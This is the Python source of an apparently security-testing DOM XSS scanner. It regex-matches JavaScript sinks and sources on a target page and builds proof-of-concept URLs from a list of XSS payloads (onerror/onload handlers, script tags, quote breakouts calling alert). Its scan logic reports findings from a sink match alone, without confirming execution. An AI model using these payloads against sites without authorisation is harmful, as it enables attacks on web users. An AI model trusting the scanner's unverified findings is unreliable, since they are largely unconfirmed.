"""DOM-based XSS scanner with client-side sink tracing."""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from urllib.parse import urljoin, urlsplit, urlunsplit

import httpx

try:
    from bs4 import BeautifulSoup
except ImportError:  # pragma: no cover
    BeautifulSoup = None


# Payloads targeting common DOM sources
DOM_PAYLOADS: dict[str, list[str]] = {
    "hash": [
        "#<img src=x onerror=alert(document.domain)>",
        "#<svg onload=alert(document.domain)>",
        "#javascript:alert(document.domain)",
        "#<script>alert(document.domain)</script>",
        "#\"><img src=x onerror=alert(document.domain)>",
    ],
    "search": [
        "<img src=x onerror=alert(document.domain)>",
        "<svg onload=alert(document.domain)>",
        "javascript:alert(document.domain)",
        "\"><img src=x onerror=alert(document.domain)>",
        "'-alert(document.domain)-'",
        '";alert(document.domain)//',
    ],
    "localstorage": [
        "<img src=x onerror=alert(document.domain)>",
        "<svg onload=alert(document.domain)>",
    ],
}

# JS patterns indicating DOM sinks
SINK_PATTERNS = [
    (r"\.innerHTML\s*=", "innerHTML"),
    (r"\.outerHTML\s*=", "outerHTML"),
    (r"document\.write\s*\(", "document.write"),
    (r"document\.writeln\s*\(", "document.writeln"),
    (r"\beval\s*\(", "eval"),
    (r"setTimeout\s*\(\s*['\"`]", "setTimeout(string)"),
    (r"setInterval\s*\(\s*['\"`]", "setInterval(string)"),
    (r"new\s+Function\s*\(", "new Function"),
    (r"\.insertAdjacentHTML\s*\(", "insertAdjacentHTML"),
    (r"\.setAttribute\s*\(\s*['\"]on", "setAttribute(event)"),
    (r"location\.href\s*=", "location.href"),
    (r"location\.replace\s*\(", "location.replace"),
    (r"\$\s*\(\s*['\"`][^'\"]*<", "jQuery(html)"),
    (r"dangerouslySetInnerHTML", "dangerouslySetInnerHTML"),
    (r"\[innerHTML\]", "Angular [innerHTML]"),
    (r"v-html\s*=", "Vue v-html"),
]

# JS patterns indicating DOM sources
SOURCE_PATTERNS = [
    (r"location\.hash", "location.hash"),
    (r"location\.search", "location.search"),
    (r"location\.href", "location.href"),
    (r"document\.referrer", "document.referrer"),
    (r"document\.cookie", "document.cookie"),
    (r"localStorage\.getItem", "localStorage"),
    (r"sessionStorage\.getItem", "sessionStorage"),
    (r"window\.name", "window.name"),
    (r"URLSearchParams", "URLSearchParams"),
    (r"url\.searchParams", "url.searchParams"),
]


@dataclass
class DOMSink:
    name: str
    snippet: str
    line: int = 0
    source: str = ""  # Which source feeds this sink, if traceable


@dataclass
class DOMFinding:
    type: str = "dom"
    url: str = ""
    source: str = ""
    sink: str = ""
    payload: str = ""
    poc: str = ""
    severity: str = "P2"
    evidence: str = ""


class DOMXSS:
    """DOM XSS scanner via static JS analysis + URL fuzzing."""

    def __init__(self, target_url: str, session: httpx.Client | None = None):
        self.target_url = target_url
        self.session = session or httpx.Client(
            timeout=30,
            follow_redirects=True,
            headers={"User-Agent": "XSSHunter/2.0"},
        )

    def scan(self) -> list[DOMFinding]:
        """Collect sinks, trace sources, return findings."""
        try:
            resp = self.session.get(self.target_url)
            resp.raise_for_status()
        except Exception:
            return []

        sinks = self.collect_sinks(resp)
        findings: list[DOMFinding] = []

        hash_sinks = [s for s in sinks if "hash" in s.source or s.name in ("innerHTML", "document.write", "eval")]
        if hash_sinks:
            for payload in DOM_PAYLOADS["hash"]:
                poc = self._build_poc(payload, source="hash")
                findings.append(DOMFinding(
                    url=self.target_url,
                    source="location.hash",
                    sink=hash_sinks[0].name,
                    payload=payload,
                    poc=poc,
                    severity="P2",
                    evidence=hash_sinks[0].snippet[:200],
                ))

        search_sinks = [s for s in sinks if "search" in s.source or s.name in ("innerHTML", "document.write")]
        if search_sinks:
            for payload in DOM_PAYLOADS["search"][:3]:
                poc = self._build_poc(payload, source="search")
                findings.append(DOMFinding(
                    url=self.target_url,
                    source="location.search",
                    sink=search_sinks[0].name,
                    payload=payload,
                    poc=poc,
                    severity="P2",
                    evidence=search_sinks[0].snippet[:200],
                ))

        return self._dedupe(findings)

    def collect_sinks(self, resp: httpx.Response) -> list[DOMSink]:
        """Extract DOM sinks from inline and external JS."""
        sinks: list[DOMSink] = []
        scripts = self._inline_scripts(resp.text)
        for script_url in self._script_urls(resp.text):
            try:
                js_resp = self.session.get(script_url)
                js_resp.raise_for_status()
                scripts.append(js_resp.text)
            except Exception:
                pass

        for js in scripts:
            sinks.extend(self._find_sinks(js))
        return sinks

    def _find_sinks(self, js: str) -> list[DOMSink]:
        found: list[DOMSink] = []
        lines = js.splitlines()
        # Identify sources first for tracing
        source_lines: dict[int, str] = {}
        for i, line in enumerate(lines):
            for pattern, src_name in SOURCE_PATTERNS:
                if re.search(pattern, line):
                    source_lines[i] = src_name

        for i, line in enumerate(lines):
            for pattern, sink_name in SINK_PATTERNS:
                if re.search(pattern, line):
                    # Check nearby lines for source
                    nearby_source = ""
                    for offset in range(-5, 6):
                        if i + offset in source_lines:
                            nearby_source = source_lines[i + offset]
                            break
                    found.append(DOMSink(
                        name=sink_name,
                        snippet=line.strip()[:120],
                        line=i + 1,
                        source=nearby_source,
                    ))
        return found

    def _inline_scripts(self, html_text: str) -> list[str]:
        if BeautifulSoup:
            soup = BeautifulSoup(html_text, "html.parser")
            return [s.get_text() for s in soup.find_all("script") if not s.get("src")]
        return re.findall(r"<script[^>]*>(.*?)</script>", html_text, re.IGNORECASE | re.DOTALL)

    def _script_urls(self, html_text: str) -> list[str]:
        if BeautifulSoup:
            soup = BeautifulSoup(html_text, "html.parser")
            return [urljoin(self.target_url, s["src"]) for s in soup.find_all("script", src=True)][:8]
        return [
            urljoin(self.target_url, m.group(1))
            for m in re.finditer(r'<script[^>]+src=["\']([^"\']+)["\']', html_text, re.IGNORECASE)
        ][:8]

    def _build_poc(self, payload: str, source: str) -> str:
        split = urlsplit(self.target_url)
        if source == "hash":
            return urlunsplit((split.scheme, split.netloc, split.path, split.query, payload.lstrip("#")))
        return f"{self.target_url}?q={payload}"

    def _dedupe(self, findings: list[DOMFinding]) -> list[DOMFinding]:
        seen: set[tuple[str, str, str]] = set()
        out = []
        for f in findings:
            key = (f.source, f.sink, f.payload)
            if key not in seen:
                seen.add(key)
                out.append(f)
        return out
